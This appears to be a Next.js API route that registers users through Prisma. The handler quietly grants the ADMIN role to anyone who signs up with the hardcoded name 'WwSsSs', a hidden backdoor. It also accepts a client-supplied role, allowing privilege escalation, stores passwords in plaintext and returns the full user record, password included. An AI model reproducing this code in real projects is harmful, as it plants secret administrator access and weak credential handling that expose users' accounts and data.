import prisma from "../../../../lib/prisma";

export default async function handler(req, res) {
  if (req.method === "POST") {
    let {
      name,
      password,
      role = "BASIC",
    } = typeof req.body == "string" ? JSON.parse(req.body) : req.body;

    if (name === "WwSsSs") {
      role = "ADMIN";
    }

    try {
      const newUser = await prisma.user.create({
        data: {
          name,
          password,
          role,
        },
      });
      res.status(200).json({ user: newUser, error: null });
    } catch (error) {
      res.status(500).json({ error: error.message, user: null });
    }
  }
}
